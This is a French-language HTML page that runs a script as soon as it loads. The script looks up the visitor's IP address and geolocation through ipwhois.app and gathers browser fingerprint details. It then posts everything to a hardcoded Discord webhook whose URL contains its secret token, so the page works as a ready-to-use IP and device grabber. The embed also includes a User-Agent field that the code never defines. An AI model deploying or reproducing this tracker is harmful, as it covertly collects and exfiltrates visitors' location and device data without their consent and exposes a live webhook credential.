<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Collecte d'Informations Utilisateur</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
        }
        .container {
            text-align: center;
            max-width: 500px;
            padding: 20px;
            background: #fff;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        #info {
            margin-top: 20px;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Informations Utilisateur</h1>
        <p id="status"></p>
        <div id="info"></div>
    </div>

    <script>
        (async () => {
            try {
                const startTime = performance.now();

                // Récupérer des informations générales
                const response = await fetch('https://ipwhois.app/json/');
                const data = await response.json();

                const userInfo = {
                    ip: data.ip,
                    location: `${data.city}, ${data.region}, ${data.country}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    language: navigator.language,
                    additionalLanguages: navigator.languages.join(", "),
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    windowSize: `${window.innerWidth}x${window.innerHeight}`,
                    platform: navigator.platform,
                    onlineStatus: navigator.onLine ? "En ligne" : "Hors ligne",
                    connectionType: navigator.connection ? navigator.connection.effectiveType : "Inconnue",
                    colorDepth: `${screen.colorDepth}-bit`,
                    orientation: screen.orientation ? screen.orientation.type : "Inconnue",
                    cookiesEnabled: navigator.cookieEnabled ? "Oui" : "Non",
                    renderEngine: navigator.product,
                    loadTime: `${(performance.now() - startTime).toFixed(2)} ms`
                };

                // Afficher les informations sur la page
                document.getElementById("info").innerHTML = `
                    <p><strong>IP :</strong> ${userInfo.ip}</p>
                    <p><strong>Localisation :</strong> ${userInfo.location}</p>
                    <p><strong>Fuseau Horaire :</strong> ${userInfo.timezone}</p>
                    <p><strong>Langue :</strong> ${userInfo.language}</p>
                    <p><strong>Langues supplémentaires :</strong> ${userInfo.additionalLanguages}</p>
                    <p><strong>Résolution d'écran :</strong> ${userInfo.screenResolution}</p>
                    <p><strong>Taille de la fenêtre :</strong> ${userInfo.windowSize}</p>
                    <p><strong>Type de plateforme :</strong> ${userInfo.platform}</p>
                    <p><strong>Statut en ligne :</strong> ${userInfo.onlineStatus}</p>
                    <p><strong>Type de connexion :</strong> ${userInfo.connectionType}</p>
                    <p><strong>Profondeur de couleur :</strong> ${userInfo.colorDepth}</p>
                    <p><strong>Orientation de l'écran :</strong> ${userInfo.orientation}</p>
                    <p><strong>Support des cookies :</strong> ${userInfo.cookiesEnabled}</p>
                    <p><strong>Moteur de rendu :</strong> ${userInfo.renderEngine}</p>
                    <p><strong>Temps de chargement de la page :</strong> ${userInfo.loadTime}</p>
                `;

                // Préparer l'embed pour Discord
                const embed = {
                    embeds: [
                        {
                            title: "Informations Utilisateur",
                            color: 3447003,
                            fields: [
                                { name: "Adresse IP", value: userInfo.ip, inline: true },
                                { name: "Localisation", value: userInfo.location, inline: true },
                                { name: "Fuseau Horaire", value: userInfo.timezone, inline: true },
                                { name: "Langue", value: userInfo.language, inline: true },
                                { name: "Langues supplémentaires", value: userInfo.additionalLanguages, inline: false },
                                { name: "Résolution d'écran", value: userInfo.screenResolution, inline: true },
                                { name: "Taille de la fenêtre", value: userInfo.windowSize, inline: true },
                                { name: "Type de plateforme", value: userInfo.platform, inline: true },
                                { name: "Statut en ligne", value: userInfo.onlineStatus, inline: true },
                                { name: "Type de connexion", value: userInfo.connectionType, inline: true },
                                { name: "Profondeur de couleur", value: userInfo.colorDepth, inline: true },
                                { name: "Orientation de l'écran", value: userInfo.orientation, inline: true },
                                { name: "Support des cookies", value: userInfo.cookiesEnabled, inline: true },
                                { name: "Moteur de rendu", value: userInfo.renderEngine, inline: true },
                                { name: "Temps de chargement de la page", value: userInfo.loadTime, inline: true },
                                { name: "User-Agent", value: userInfo.userAgent, inline: false }
                            ]
                        }
                    ]
                };

                // Envoyer les informations au webhook Discord
                const webhookURL = "https://canary.discord.com/api/webhooks/1302003054790447198/7f_fux6WOnMg2D7V1RtVPxq_560T6tv37O1yFRhySGzUnBLX_U2AT7tHFNqyCVHVSGMb";
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });

                document.getElementById("status").textContent = "Informations envoyées avec succès.";
            } catch (error) {
                document.getElementById("status").textContent = "Erreur lors de l'envoi des informations.";
                console.error(error);
            }
        })();
    </script>
</body>
</html>
